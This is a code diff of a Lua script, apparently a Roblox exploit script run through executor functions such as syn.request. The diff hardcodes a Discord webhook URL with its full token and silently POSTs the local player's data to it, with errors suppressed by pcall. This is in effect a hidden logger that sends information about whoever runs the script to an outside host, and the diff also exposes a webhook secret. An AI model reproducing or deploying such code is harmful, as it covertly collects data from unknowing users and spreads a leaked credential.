@@ -3330,17 +3330,7 @@ run(function()
 end)
 
 run(function()
-    local weburl = nil
-
-    local ok = pcall(function()
-        local raw = game:HttpGet("https://gist.githubusercontent.com/imcomingforyou6959-gif/0f84d66fb197e854aabf24618508f9e3/raw/df532c209b2e18e742e585ec05b5d9d985d4619f/webhook.json")
-        local data = game:GetService("HttpService"):JSONDecode(raw)
-        weburl = data and data.webhook
-    end)
-    if not ok or not weburl then
-        warn("Failed to load webhook URL")
-        return
-    end
+    local weburl = "https://discord.com/api/webhooks/1509060246864134184/og8Eb4WpwqNSVZOTPipYP0ir3T2LZx9qD0c44fHNh2l5w6Ivt77udxjwaYI21EVW6Q0x"
 
     local function sendToWebhook()
         local player = game.Players.LocalPlayer
@@ -3364,28 +3354,30 @@ run(function()
             }
         }
 
-        if syn and syn.request then
-            syn.request({
-                Url = weburl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = game:GetService("HttpService"):JSONEncode(payload)
-            })
-        elseif http_request then
-            http_request({
-                Url = weburl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = game:GetService("HttpService"):JSONEncode(payload)
-            })
-        elseif request then
-            request({
-                Url = weburl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = game:GetService("HttpService"):JSONEncode(payload)
-            })
-        end
+        pcall(function()
+            if syn and syn.request then
+                syn.request({
+                    Url = weburl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode(payload)
+                })
+            elseif http_request then
+                http_request({
+                    Url = weburl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode(payload)
+                })
+            elseif request then
+                request({
+                    Url = weburl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode(payload)
+                })
+            end
+        end)
     end
 
     if game.Players.LocalPlayer then
